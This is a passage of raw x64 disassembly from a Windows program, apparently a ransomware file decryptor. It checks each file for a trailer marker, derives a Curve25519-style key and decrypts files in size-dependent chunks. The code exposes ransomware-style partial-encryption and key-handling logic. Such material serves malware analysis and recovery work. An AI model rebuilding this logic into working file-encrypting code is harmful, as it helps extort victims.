   14000468a:	e8 21 e6 ff ff       	call   0x140002cb0
   14000468f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004694:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004699:	e8 12 e6 ff ff       	call   0x140002cb0
   14000469e:	48 83 eb 01          	sub    $0x1,%rbx
   1400046a2:	75 dc                	jne    0x140004680
   1400046a4:	4c 8d 85 50 01 00 00 	lea    0x150(%rbp),%r8
   1400046ab:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400046b0:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400046b5:	e8 66 e1 ff ff       	call   0x140002820
   1400046ba:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400046bf:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400046c4:	e8 e7 e5 ff ff       	call   0x140002cb0
   1400046c9:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400046ce:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400046d3:	e8 d8 e5 ff ff       	call   0x140002cb0
   1400046d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400046df:	00 
   1400046e0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400046e5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400046ea:	e8 c1 e5 ff ff       	call   0x140002cb0
   1400046ef:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400046f4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400046f9:	e8 b2 e5 ff ff       	call   0x140002cb0
   1400046fe:	48 83 ef 01          	sub    $0x1,%rdi
   140004702:	75 dc                	jne    0x1400046e0
   140004704:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   140004708:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000470d:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140004711:	e8 0a e1 ff ff       	call   0x140002820
   140004716:	48 8d 55 10          	lea    0x10(%rbp),%rdx
   14000471a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000471f:	e8 8c e5 ff ff       	call   0x140002cb0
   140004724:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004729:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000472e:	e8 7d e5 ff ff       	call   0x140002cb0
   140004733:	bb 18 00 00 00       	mov    $0x18,%ebx
   140004738:	8b fb                	mov    %ebx,%edi
   14000473a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004740:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004745:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000474a:	e8 61 e5 ff ff       	call   0x140002cb0
   14000474f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004754:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004759:	e8 52 e5 ff ff       	call   0x140002cb0
   14000475e:	48 83 ef 01          	sub    $0x1,%rdi
   140004762:	75 dc                	jne    0x140004740
   140004764:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   140004768:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000476d:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   140004774:	e8 a7 e0 ff ff       	call   0x140002820
   140004779:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140004780:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004785:	e8 26 e5 ff ff       	call   0x140002cb0
   14000478a:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000478f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004794:	e8 17 e5 ff ff       	call   0x140002cb0
   140004799:	bf 31 00 00 00       	mov    $0x31,%edi
   14000479e:	66 90                	xchg   %ax,%ax
   1400047a0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400047a5:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400047aa:	e8 01 e5 ff ff       	call   0x140002cb0
   1400047af:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400047b4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047b9:	e8 f2 e4 ff ff       	call   0x140002cb0
   1400047be:	48 83 ef 01          	sub    $0x1,%rdi
   1400047c2:	75 dc                	jne    0x1400047a0
   1400047c4:	4c 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%r8
   1400047cb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400047d0:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400047d5:	e8 46 e0 ff ff       	call   0x140002820
   1400047da:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400047df:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047e4:	e8 c7 e4 ff ff       	call   0x140002cb0
   1400047e9:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400047ee:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400047f3:	e8 b8 e4 ff ff       	call   0x140002cb0
   1400047f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400047ff:	00 
   140004800:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004805:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000480a:	e8 a1 e4 ff ff       	call   0x140002cb0
   14000480f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004814:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004819:	e8 92 e4 ff ff       	call   0x140002cb0
   14000481e:	48 83 eb 01          	sub    $0x1,%rbx
   140004822:	75 dc                	jne    0x140004800
   140004824:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   140004828:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000482d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004832:	e8 e9 df ff ff       	call   0x140002820
   140004837:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000483c:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140004841:	e8 6a e4 ff ff       	call   0x140002cb0
   140004846:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   14000484b:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004850:	e8 5b e4 ff ff       	call   0x140002cb0
   140004855:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000485a:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000485f:	e8 4c e4 ff ff       	call   0x140002cb0
   140004864:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004869:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000486e:	e8 3d e4 ff ff       	call   0x140002cb0
   140004873:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004878:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000487d:	e8 2e e4 ff ff       	call   0x140002cb0
   140004882:	4c 8d 85 f0 01 00 00 	lea    0x1f0(%rbp),%r8
   140004889:	48 8b ce             	mov    %rsi,%rcx
   14000488c:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140004891:	e8 8a df ff ff       	call   0x140002820
   140004896:	48 8b 8d 40 02 00 00 	mov    0x240(%rbp),%rcx
   14000489d:	48 33 cc             	xor    %rsp,%rcx
   1400048a0:	e8 3b 51 00 00       	call   0x1400099e0
   1400048a5:	48 8b 9c 24 80 03 00 	mov    0x380(%rsp),%rbx
   1400048ac:	00 
   1400048ad:	48 81 c4 50 03 00 00 	add    $0x350,%rsp
   1400048b4:	5f                   	pop    %rdi
   1400048b5:	5e                   	pop    %rsi
   1400048b6:	5d                   	pop    %rbp
   1400048b7:	c3                   	ret
   1400048b8:	cc                   	int3
   1400048b9:	cc                   	int3
   1400048ba:	cc                   	int3
   1400048bb:	cc                   	int3
   1400048bc:	cc                   	int3
   1400048bd:	cc                   	int3
   1400048be:	cc                   	int3
   1400048bf:	cc                   	int3
   1400048c0:	40 55                	rex push %rbp
   1400048c2:	53                   	push   %rbx
   1400048c3:	41 54                	push   %r12
   1400048c5:	41 55                	push   %r13
   1400048c7:	41 56                	push   %r14
   1400048c9:	48 8d ac 24 c0 ec ff 	lea    -0x1340(%rsp),%rbp
   1400048d0:	ff 
   1400048d1:	b8 40 14 00 00       	mov    $0x1440,%eax
   1400048d6:	e8 35 53 00 00       	call   0x140009c10
   1400048db:	48 2b e0             	sub    %rax,%rsp
   1400048de:	48 8b 05 1b 67 00 00 	mov    0x671b(%rip),%rax        # 0x14000b000
   1400048e5:	48 33 c4             	xor    %rsp,%rax
   1400048e8:	48 89 85 30 13 00 00 	mov    %rax,0x1330(%rbp)
   1400048ef:	4c 8b e1             	mov    %rcx,%r12
   1400048f2:	48 8b 0d 07 6d 00 00 	mov    0x6d07(%rip),%rcx        # 0x14000b600
   1400048f9:	ba 08 00 00 00       	mov    $0x8,%edx
   1400048fe:	41 b8 40 00 01 00    	mov    $0x10040,%r8d
   140004904:	ff 15 de 87 00 00    	call   *0x87de(%rip)        # 0x14000d0e8
   14000490a:	48 8b d8             	mov    %rax,%rbx
   14000490d:	48 85 c0             	test   %rax,%rax
   140004910:	74 e0                	je     0x1400048f2
   140004912:	49 8b d4             	mov    %r12,%rdx
   140004915:	48 8b c8             	mov    %rax,%rcx
   140004918:	ff 15 a2 87 00 00    	call   *0x87a2(%rip)        # 0x14000d0c0
   14000491e:	49 8b cc             	mov    %r12,%rcx
   140004921:	ff 15 09 87 00 00    	call   *0x8709(%rip)        # 0x14000d030
   140004927:	48 63 c8             	movslq %eax,%rcx
   14000492a:	45 33 ed             	xor    %r13d,%r13d
   14000492d:	41 b8 09 00 00 00    	mov    $0x9,%r8d
   140004933:	48 8b d3             	mov    %rbx,%rdx
   140004936:	66 44 89 6c 4b f4    	mov    %r13w,-0xc(%rbx,%rcx,2)
   14000493c:	49 8b cc             	mov    %r12,%rcx
   14000493f:	ff 15 6b 87 00 00    	call   *0x876b(%rip)        # 0x14000d0b0
   140004945:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   14000494a:	45 33 c9             	xor    %r9d,%r9d
   14000494d:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140004954:	00 
   140004955:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   14000495a:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004960:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140004967:	00 
   140004968:	48 8b cb             	mov    %rbx,%rcx
   14000496b:	ff 15 f7 86 00 00    	call   *0x86f7(%rip)        # 0x14000d068
   140004971:	48 8b 0d 88 6c 00 00 	mov    0x6c88(%rip),%rcx        # 0x14000b600
   140004978:	4c 8b c3             	mov    %rbx,%r8
   14000497b:	33 d2                	xor    %edx,%edx
   14000497d:	4c 8b f0             	mov    %rax,%r14
   140004980:	ff 15 5a 87 00 00    	call   *0x875a(%rip)        # 0x14000d0e0
   140004986:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   14000498a:	0f 84 2a 05 00 00    	je     0x140004eba
   140004990:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140004995:	49 8b ce             	mov    %r14,%rcx
   140004998:	ff 15 7a 86 00 00    	call   *0x867a(%rip)        # 0x14000d018
   14000499e:	48 83 7c 24 48 48    	cmpq   $0x48,0x48(%rsp)
   1400049a4:	0f 8e 07 05 00 00    	jle    0x140004eb1
   1400049aa:	48 89 b4 24 78 14 00 	mov    %rsi,0x1478(%rsp)
   1400049b1:	00 
   1400049b2:	48 89 bc 24 80 14 00 	mov    %rdi,0x1480(%rsp)
   1400049b9:	00 
   1400049ba:	48 bf 67 66 66 66 66 	movabs $0x6666666666666667,%rdi
   1400049c1:	66 66 66 
   1400049c4:	4c 89 bc 24 88 14 00 	mov    %r15,0x1488(%rsp)
   1400049cb:	00 
   1400049cc:	49 bf 6f 6e 67 20 6c 	movabs $0x6b6f6f6c20676e6f,%r15
   1400049d3:	6f 6f 6b 
   1400049d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400049dd:	00 00 00 
   1400049e0:	48 8b 0d 19 6c 00 00 	mov    0x6c19(%rip),%rcx        # 0x14000b600
   1400049e7:	ba 08 00 00 00       	mov    $0x8,%edx
   1400049ec:	41 b8 40 00 10 00    	mov    $0x100040,%r8d
   1400049f2:	ff 15 f0 86 00 00    	call   *0x86f0(%rip)        # 0x14000d0e8
   1400049f8:	48 8b f0             	mov    %rax,%rsi
   1400049fb:	48 85 c0             	test   %rax,%rax
   1400049fe:	74 e0                	je     0x1400049e0
   140004a00:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140004a05:	45 33 c9             	xor    %r9d,%r9d
   140004a08:	45 33 c0             	xor    %r8d,%r8d
   140004a0b:	49 8b ce             	mov    %r14,%rcx
   140004a0e:	48 8d 53 b8          	lea    -0x48(%rbx),%rdx
   140004a12:	ff 15 90 86 00 00    	call   *0x8690(%rip)        # 0x14000d0a8
   140004a18:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004a1d:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004a22:	41 b8 48 00 00 00    	mov    $0x48,%r8d
   140004a28:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140004a2c:	49 8b ce             	mov    %r14,%rcx
   140004a2f:	ff 15 cb 85 00 00    	call   *0x85cb(%rip)        # 0x14000d000
   140004a35:	48 b8 63 68 6f 75 6e 	movabs $0x6420676e756f6863,%rax
   140004a3c:	67 20 64 
   140004a3f:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   140004a43:	0f 85 3e 04 00 00    	jne    0x140004e87
   140004a49:	4c 39 7d d0          	cmp    %r15,-0x30(%rbp)
   140004a4d:	0f 85 34 04 00 00    	jne    0x140004e87
   140004a53:	48 b8 73 20 6c 69 6b 	movabs $0x6820656b696c2073,%rax
   140004a5a:	65 20 68 
   140004a5d:	48 39 45 d8          	cmp    %rax,-0x28(%rbp)
   140004a61:	0f 85 20 04 00 00    	jne    0x140004e87
   140004a67:	48 b8 6f 74 20 64 6f 	movabs $0x2121676f6420746f,%rax
   140004a6e:	67 21 21 
   140004a71:	48 39 45 e0          	cmp    %rax,-0x20(%rbp)
   140004a75:	0f 85 0c 04 00 00    	jne    0x140004e87
   140004a7b:	0f 10 05 c6 65 00 00 	movups 0x65c6(%rip),%xmm0        # 0x14000b048
   140004a82:	48 83 6c 24 48 48    	subq   $0x48,0x48(%rsp)
   140004a88:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140004a8c:	0f 10 0d c5 65 00 00 	movups 0x65c5(%rip),%xmm1        # 0x14000b058
   140004a93:	48 8d 8d 00 12 00 00 	lea    0x1200(%rbp),%rcx
   140004a9a:	66 0f 7e c0          	movd   %xmm0,%eax
   140004a9e:	0f 11 8d 00 13 00 00 	movups %xmm1,0x1300(%rbp)
   140004aa5:	24 f8                	and    $0xf8,%al
   140004aa7:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   140004aac:	0f 11 85 f0 12 00 00 	movups %xmm0,0x12f0(%rbp)
   140004ab3:	88 85 f0 12 00 00    	mov    %al,0x12f0(%rbp)
   140004ab9:	66 0f 7e c8          	movd   %xmm1,%eax
   140004abd:	24 3f                	and    $0x3f,%al
   140004abf:	0c 40                	or     $0x40,%al
   140004ac1:	88 85 0f 13 00 00    	mov    %al,0x130f(%rbp)
   140004ac7:	e8 54 e3 ff ff       	call   0x140002e20
   140004acc:	4c 8d 8d 00 12 00 00 	lea    0x1200(%rbp),%r9
   140004ad3:	4c 8d 85 f0 12 00 00 	lea    0x12f0(%rbp),%r8
   140004ada:	48 8d 95 a0 11 00 00 	lea    0x11a0(%rbp),%rdx
   140004ae1:	48 8d 8d a0 12 00 00 	lea    0x12a0(%rbp),%rcx
   140004ae8:	e8 f3 f5 ff ff       	call   0x1400040e0
   140004aed:	48 8d 95 a0 11 00 00 	lea    0x11a0(%rbp),%rdx
   140004af4:	48 8d 8d 50 12 00 00 	lea    0x1250(%rbp),%rcx
   140004afb:	e8 f0 f9 ff ff       	call   0x1400044f0
   140004b00:	4c 8d 85 50 12 00 00 	lea    0x1250(%rbp),%r8
   140004b07:	48 8d 95 a0 12 00 00 	lea    0x12a0(%rbp),%rdx
   140004b0e:	48 8d 8d a0 11 00 00 	lea    0x11a0(%rbp),%rcx
   140004b15:	e8 06 dd ff ff       	call   0x140002820
   140004b1a:	48 8d 95 a0 11 00 00 	lea    0x11a0(%rbp),%rdx
   140004b21:	48 8d 8d 10 13 00 00 	lea    0x1310(%rbp),%rcx
   140004b28:	e8 f3 e4 ff ff       	call   0x140003020
   140004b2d:	0f 28 05 cc d0 ff ff 	movaps -0x2f34(%rip),%xmm0        # 0x140001c00
   140004b34:	48 8d 95 10 13 00 00 	lea    0x1310(%rbp),%rdx
   140004b3b:	0f 28 0d ce d0 ff ff 	movaps -0x2f32(%rip),%xmm1        # 0x140001c10
   140004b42:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004b46:	0f 29 45 f0          	movaps %xmm0,-0x10(%rbp)
   140004b4a:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   140004b50:	0f 28 05 c9 d0 ff ff 	movaps -0x2f37(%rip),%xmm0        # 0x140001c20
   140004b57:	0f 29 4d 00          	movaps %xmm1,0x0(%rbp)
   140004b5b:	0f 28 0d ce d0 ff ff 	movaps -0x2f32(%rip),%xmm1        # 0x140001c30
   140004b62:	0f 29 45 10          	movaps %xmm0,0x10(%rbp)
   140004b66:	0f 29 4d 20          	movaps %xmm1,0x20(%rbp)
   140004b6a:	4c 89 ad b0 00 00 00 	mov    %r13,0xb0(%rbp)
   140004b71:	4c 89 ad b8 00 00 00 	mov    %r13,0xb8(%rbp)
   140004b78:	44 89 ad c0 00 00 00 	mov    %r13d,0xc0(%rbp)
   140004b7f:	e8 2c 42 00 00       	call   0x140008db0
   140004b84:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004b89:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004b8d:	e8 4e 48 00 00       	call   0x1400093e0
   140004b92:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004b97:	e8 f4 2a 00 00       	call   0x140007690
   140004b9c:	45 33 c9             	xor    %r9d,%r9d
   140004b9f:	39 45 c0             	cmp    %eax,-0x40(%rbp)
   140004ba2:	0f 85 cd 02 00 00    	jne    0x140004e75
   140004ba8:	45 33 c0             	xor    %r8d,%r8d
   140004bab:	48 8d 53 b8          	lea    -0x48(%rbx),%rdx
   140004baf:	49 8b ce             	mov    %r14,%rcx
   140004bb2:	ff 15 f0 84 00 00    	call   *0x84f0(%rip)        # 0x14000d0a8
   140004bb8:	49 8b ce             	mov    %r14,%rcx
   140004bbb:	ff 15 8f 84 00 00    	call   *0x848f(%rip)        # 0x14000d050
   140004bc1:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140004bc5:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   140004bc9:	89 85 54 11 00 00    	mov    %eax,0x1154(%rbp)
   140004bcf:	48 8d 8d d0 00 00 00 	lea    0xd0(%rbp),%rcx
   140004bd6:	8b 44 24 64          	mov    0x64(%rsp),%eax
   140004bda:	89 85 58 11 00 00    	mov    %eax,0x1158(%rbp)
   140004be0:	8b 44 24 68          	mov    0x68(%rsp),%eax
   140004be4:	89 85 5c 11 00 00    	mov    %eax,0x115c(%rbp)
   140004bea:	8b 44 24 6c          	mov    0x6c(%rsp),%eax
   140004bee:	89 85 60 11 00 00    	mov    %eax,0x1160(%rbp)
   140004bf4:	8b 44 24 70          	mov    0x70(%rsp),%eax
   140004bf8:	89 85 64 11 00 00    	mov    %eax,0x1164(%rbp)
   140004bfe:	8b 44 24 74          	mov    0x74(%rsp),%eax
   140004c02:	89 85 68 11 00 00    	mov    %eax,0x1168(%rbp)
   140004c08:	8b 44 24 78          	mov    0x78(%rsp),%eax
   140004c0c:	89 85 6c 11 00 00    	mov    %eax,0x116c(%rbp)
   140004c12:	8b 44 24 7c          	mov    0x7c(%rsp),%eax
   140004c16:	89 85 70 11 00 00    	mov    %eax,0x1170(%rbp)
   140004c1c:	c7 85 94 11 00 00 00 	movl   $0x100,0x1194(%rbp)
   140004c23:	01 00 00 
   140004c26:	c7 85 98 11 00 00 00 	movl   $0x100,0x1198(%rbp)
   140004c2d:	01 00 00 
   140004c30:	e8 1b 24 00 00       	call   0x140007050
   140004c35:	45 33 c9             	xor    %r9d,%r9d
   140004c38:	45 33 c0             	xor    %r8d,%r8d
   140004c3b:	49 8b d5             	mov    %r13,%rdx
   140004c3e:	49 8b ce             	mov    %r14,%rcx
   140004c41:	49 8b dd             	mov    %r13,%rbx
   140004c44:	ff 15 5e 84 00 00    	call   *0x845e(%rip)        # 0x14000d0a8
   140004c4a:	4c 8b 44 24 48       	mov    0x48(%rsp),%r8
   140004c4f:	49 81 f8 00 00 40 01 	cmp    $0x1400000,%r8
   140004c56:	0f 8e d4 00 00 00    	jle    0x140004d30
   140004c5c:	48 8b c7             	mov    %rdi,%rax
   140004c5f:	49 f7 e8             	imul   %r8
   140004c62:	48 8b fa             	mov    %rdx,%rdi
   140004c65:	48 c1 ff 16          	sar    $0x16,%rdi
   140004c69:	48 8b c7             	mov    %rdi,%rax
   140004c6c:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004c70:	48 03 f8             	add    %rax,%rdi
   140004c73:	48 85 ff             	test   %rdi,%rdi
   140004c76:	0f 8e 8b 00 00 00    	jle    0x140004d07
   140004c7c:	0f 1f 40 00          	nopl   0x0(%rax)
   140004c80:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004c85:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004c8a:	41 b8 00 00 10 00    	mov    $0x100000,%r8d
   140004c90:	48 8b d6             	mov    %rsi,%rdx
   140004c93:	49 8b ce             	mov    %r14,%rcx
   140004c96:	ff 15 64 83 00 00    	call   *0x8364(%rip)        # 0x14000d000
   140004c9c:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140004ca0:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   140004ca7:	4c 8b ce             	mov    %rsi,%r9
   140004caa:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140004cae:	4c 8b c6             	mov    %rsi,%r8
   140004cb1:	e8 5a 27 00 00       	call   0x140007410
   140004cb6:	45 33 c9             	xor    %r9d,%r9d
   140004cb9:	45 33 c0             	xor    %r8d,%r8d
   140004cbc:	48 8b d3             	mov    %rbx,%rdx
   140004cbf:	49 8b ce             	mov    %r14,%rcx
   140004cc2:	ff 15 e0 83 00 00    	call   *0x83e0(%rip)        # 0x14000d0a8
   140004cc8:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140004ccd:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004cd2:	41 b8 00 00 10 00    	mov    $0x100000,%r8d
   140004cd8:	48 8b d6             	mov    %rsi,%rdx
   140004cdb:	49 8b ce             	mov    %r14,%rcx
   140004cde:	ff 15 54 83 00 00    	call   *0x8354(%rip)        # 0x14000d038
   140004ce4:	48 81 c3 00 00 a0 00 	add    $0xa00000,%rbx
   140004ceb:	45 33 c9             	xor    %r9d,%r9d
   140004cee:	48 8b d3             	mov    %rbx,%rdx
   140004cf1:	45 33 c0             	xor    %r8d,%r8d
   140004cf4:	49 8b ce             	mov    %r14,%rcx
   140004cf7:	ff 15 ab 83 00 00    	call   *0x83ab(%rip)        # 0x14000d0a8
   140004cfd:	48 83 ef 01          	sub    $0x1,%rdi
   140004d01:	0f 85 79 ff ff ff    	jne    0x140004c80
   140004d07:	48 bf 67 66 66 66 66 	movabs $0x6666666666666667,%rdi
   140004d0e:	66 66 66 
   140004d11:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140004d16:	49 8b ce             	mov    %r14,%rcx
   140004d19:	ff 15 f9 82 00 00    	call   *0x82f9(%rip)        # 0x14000d018
   140004d1f:	48 83 7c 24 48 48    	cmpq   $0x48,0x48(%rsp)
   140004d25:	0f 8f b5 fc ff ff    	jg     0x1400049e0
   140004d2b:	e9 69 01 00 00       	jmp    0x140004e99
   140004d30:	49 81 f8 00 00 50 00 	cmp    $0x500000,%r8
   140004d37:	0f 8e b0 00 00 00    	jle    0x140004ded
   140004d3d:	48 b8 56 55 55 55 55 	movabs $0x5555555555555556,%rax
   140004d44:	55 55 55 
   140004d47:	41 bf 03 00 00 00    	mov    $0x3,%r15d
   140004d4d:	49 f7 e8             	imul   %r8
   140004d50:	48 8b fa             	mov    %rdx,%rdi
   140004d53:	48 c1 ef 3f          	shr    $0x3f,%rdi
   140004d57:	48 03 fa             	add    %rdx,%rdi
   140004d5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d60:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004d65:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004d6a:	41 b8 00 00 10 00    	mov    $0x100000,%r8d
   140004d70:	48 8b d6             	mov    %rsi,%rdx
   140004d73:	49 8b ce             	mov    %r14,%rcx
   140004d76:	ff 15 84 82 00 00    	call   *0x8284(%rip)        # 0x14000d000
   140004d7c:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140004d80:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   140004d87:	4c 8b ce             	mov    %rsi,%r9
   140004d8a:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140004d8e:	4c 8b c6             	mov    %rsi,%r8
   140004d91:	e8 7a 26 00 00       	call   0x140007410
   140004d96:	45 33 c9             	xor    %r9d,%r9d
   140004d99:	45 33 c0             	xor    %r8d,%r8d
   140004d9c:	48 8b d3             	mov    %rbx,%rdx
   140004d9f:	49 8b ce             	mov    %r14,%rcx
   140004da2:	ff 15 00 83 00 00    	call   *0x8300(%rip)        # 0x14000d0a8
   140004da8:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   140004dad:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140004db2:	48 8b d6             	mov    %rsi,%rdx
   140004db5:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004dba:	49 8b ce             	mov    %r14,%rcx
   140004dbd:	ff 15 75 82 00 00    	call   *0x8275(%rip)        # 0x14000d038
   140004dc3:	48 03 df             	add    %rdi,%rbx
   140004dc6:	45 33 c9             	xor    %r9d,%r9d
   140004dc9:	48 8b d3             	mov    %rbx,%rdx
   140004dcc:	45 33 c0             	xor    %r8d,%r8d
   140004dcf:	49 8b ce             	mov    %r14,%rcx
   140004dd2:	ff 15 d0 82 00 00    	call   *0x82d0(%rip)        # 0x14000d0a8
   140004dd8:	49 83 ef 01          	sub    $0x1,%r15
   140004ddc:	75 82                	jne    0x140004d60
   140004dde:	49 bf 6f 6e 67 20 6c 	movabs $0x6b6f6f6c20676e6f,%r15
   140004de5:	6f 6f 6b 
   140004de8:	e9 1a ff ff ff       	jmp    0x140004d07
   140004ded:	4d 85 c0             	test   %r8,%r8
   140004df0:	0f 8e 1b ff ff ff    	jle    0x140004d11
   140004df6:	49 83 f8 40          	cmp    $0x40,%r8
   140004dfa:	7e 17                	jle    0x140004e13
   140004dfc:	48 8b c7             	mov    %rdi,%rax
   140004dff:	49 f7 e8             	imul   %r8
   140004e02:	4c 8b c2             	mov    %rdx,%r8
   140004e05:	49 c1 f8 02          	sar    $0x2,%r8
   140004e09:	49 8b c0             	mov    %r8,%rax
   140004e0c:	48 c1 e8 3f          	shr    $0x3f,%rax
   140004e10:	4c 03 c0             	add    %rax,%r8
   140004e13:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004e18:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004e1d:	48 8b d6             	mov    %rsi,%rdx
   140004e20:	49 8b ce             	mov    %r14,%rcx
   140004e23:	ff 15 d7 81 00 00    	call   *0x81d7(%rip)        # 0x14000d000
   140004e29:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140004e2d:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   140004e34:	4c 8b ce             	mov    %rsi,%r9
   140004e37:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140004e3b:	4c 8b c6             	mov    %rsi,%r8
   140004e3e:	e8 cd 25 00 00       	call   0x140007410
   140004e43:	45 33 c9             	xor    %r9d,%r9d
   140004e46:	45 33 c0             	xor    %r8d,%r8d
   140004e49:	48 8b d3             	mov    %rbx,%rdx
   140004e4c:	49 8b ce             	mov    %r14,%rcx
   140004e4f:	ff 15 53 82 00 00    	call   *0x8253(%rip)        # 0x14000d0a8
   140004e55:	44 8b 44 24 40       	mov    0x40(%rsp),%r8d
   140004e5a:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140004e5f:	48 8b d6             	mov    %rsi,%rdx
   140004e62:	4c 89 6c 24 20       	mov    %r13,0x20(%rsp)
   140004e67:	49 8b ce             	mov    %r14,%rcx
   140004e6a:	ff 15 c8 81 00 00    	call   *0x81c8(%rip)        # 0x14000d038
   140004e70:	e9 9c fe ff ff       	jmp    0x140004d11
   140004e75:	4c 8d 05 9c c4 ff ff 	lea    -0x3b64(%rip),%r8        # 0x140001318
   140004e7c:	49 8b d4             	mov    %r12,%rdx
   140004e7f:	33 c9                	xor    %ecx,%ecx
   140004e81:	ff 15 49 83 00 00    	call   *0x8349(%rip)        # 0x14000d1d0
